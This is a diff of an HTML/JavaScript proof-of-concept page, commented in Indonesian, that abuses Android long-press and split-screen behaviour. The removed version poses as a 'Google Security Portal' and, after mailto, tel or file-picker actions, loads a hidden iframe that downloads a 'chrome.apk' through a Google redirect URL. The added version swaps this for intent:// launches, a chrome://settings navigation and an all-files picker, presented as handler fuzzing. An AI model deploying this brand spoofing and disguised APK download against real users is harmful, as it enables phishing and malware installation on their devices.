@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Multi-Intent Download Spoof PoC</title>
+    <title>Advanced Android Intent & Internal Handler PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -35,7 +35,7 @@
             flex-direction: column;
             gap: 12px;
             width: 100%;
-            max-width: 360px;
+            max-width: 380px;
         }
         a.spoof-link {
             display: inline-block;
@@ -67,79 +67,63 @@
 </head>
 <body>
 
-    <div class="banner">Google Security Portal</div>
-    <h1>Secure Document Verification & Distribution</h1>
+    <div class="banner">System Security Portal</div>
+    <h1>Internal Handler & Intent Fuzzing PoC</h1>
 
-    <!-- 4 Tombol dengan Kombinasi Target Google.com & Multi-Intent Downloads -->
+    <!-- 4 Tombol dengan Fokus Intent Handler Internal & System Settings -->
     <div class="button-container">
-        <a href="https://www.google.com" class="spoof-link" id="btnMailto" data-intent="identity_verification" data-action="mailto">Open Window & Mailto + APK Download</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnTel" data-intent="account_recovery" data-action="tel">Open Window & Tel + APK Download</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnFile" data-intent="document_upload" data-action="filepicker">Open Window & FilePicker + APK Download</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnDownload" data-intent="security_certificate" data-action="download">Open Window & Direct Multi-APK Download</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnSettings" data-intent="system_settings" data-action="settings">Open Window & Launch Android Settings</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnChromeScheme" data-intent="internal_chrome_page" data-action="chromescheme">Open Window & Access Chrome URL</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnFilePicker" data-intent="local_filesystem" data-action="filepicker">Open Window & Local File Access API</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnCustomIntent" data-intent="custom_intent_scheme" data-action="intent">Open Window & Custom Intent Scheme</a>
     </div>
 
     <div class="file-info" id="fileInfo">Status: Ready for interaction.</div>
-    <div class="footer-note">Cloud-secured verification system.</div>
+    <div class="footer-note">Internal system context separation test.</div>
 
     <script>
         let triggered = false;
-
-        // Fungsi pemicu unduhan APK utama melalui iframe tersembunyi
-        const triggerApkDownload = () => {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            // Menggunakan URL Google Redirect APK Anda
-            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
-            document.body.appendChild(iframe);
-        };
 
         const executeAttackVector = async (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
             const fileInfo = document.getElementById("fileInfo");
-            fileInfo.innerText = `Executing intent [${intent}] with action [${actionType}]...`;
+            fileInfo.innerText = `Executing internal handler intent [${intent}] with action [${actionType}]...`;
 
-            // Jeda 2.4 detik agar jendela atas (Google.com) sempat terbuka sempurna dalam mode split-screen
+            // Jeda 2.4 detik agar jendela atas (Google.com) terbuka sempurna dalam mode split-screen
             setTimeout(async () => {
                 try {
-                    if (actionType === 'mailto') {
-                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
-                        const body = encodeURIComponent("Hello Google Security,\n\nVerifying intent: " + intent);
-                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
-                        setTimeout(triggerApkDownload, 600);
+                    if (actionType === 'settings') {
+                        // Memicu intent skema pengaturan sistem Android secara langsung
+                        window.location.href = "intent://#Intent;action=android.settings.SETTINGS;end";
+                        fileInfo.innerText = `Triggered Android Settings Intent for: [${intent}]`;
                     } 
-                    else if (actionType === 'tel') {
-                        window.location.href = "tel:+18005550199";
-                        setTimeout(triggerApkDownload, 600);
+                    else if (actionType === 'chromescheme') {
+                        // Memicu akses ke halaman internal browser Chrome
+                        window.location.href = "chrome://settings/";
+                        fileInfo.innerText = `Triggered internal Chrome scheme for: [${intent}]`;
                     } 
                     else if (actionType === 'filepicker') {
+                        // Memanfaatkan File System Access API untuk interaksi penyimpanan lokal
                         if (window.showOpenFilePicker) {
                             const [fileHandle] = await window.showOpenFilePicker({
                                 multiple: false,
-                                types: [{ description: 'Documents', accept: { 'application/pdf': ['.pdf'], 'image/*': ['.png', '.jpg'] } }]
+                                types: [{ description: 'All Files', accept: { '*/*': [] } }]
                             });
                             const file = await fileHandle.getFile();
-                            fileInfo.innerText = `File selected: ${file.name}. Triggering payload...`;
+                            fileInfo.innerText = `Accessed local file handle: ${file.name}`;
+                        } else {
+                            fileInfo.innerText = `File System Access API not supported in this context.`;
                         }
-                        setTimeout(triggerApkDownload, 400);
                     }
-                    else if (actionType === 'download') {
-                        // Kombinasi langsung mendownload sertifikat teks dan APK secara beruntun
-                        const dummyContent = `Google Security Certificate\nIntent: ${intent}\nTimestamp: ${new Date().toISOString()}`;
-                        const blob = new Blob([dummyContent], { type: 'text/plain' });
-                        const blobUrl = URL.createObjectURL(blob);
-                        
-                        const downloadAnchor = document.createElement('a');
-                        downloadAnchor.href = blobUrl;
-                        downloadAnchor.download = `Security_Cert_${intent}.txt`;
-                        document.body.appendChild(downloadAnchor);
-                        downloadAnchor.click();
-                        document.body.removeChild(downloadAnchor);
-
-                        setTimeout(triggerApkDownload, 800);
+                    else if (actionType === 'intent') {
+                        // Memicu kustom skema intent Android eksternal/internal
+                        window.location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
+                        fileInfo.innerText = `Triggered custom application intent scheme for: [${intent}]`;
                     }
                 } catch (err) {
+                    fileInfo.innerText = `Operation restricted or blocked: ${err.message}`;
                     console.debug("Operation cancelled or restricted:", err.message);
                 } finally {
                     setTimeout(() => { triggered = false; }, 1500);
@@ -148,7 +132,7 @@
         };
 
         // Memasang event listener contextmenu (long-press pada Android) untuk tiap tombol
-        ['btnMailto', 'btnTel', 'btnFile', 'btnDownload'].forEach(id => {
+        ['btnSettings', 'btnChromeScheme', 'btnFilePicker', 'btnCustomIntent'].forEach(id => {
             const el = document.getElementById(id);
             el.addEventListener("contextmenu", (e) => {
                 executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
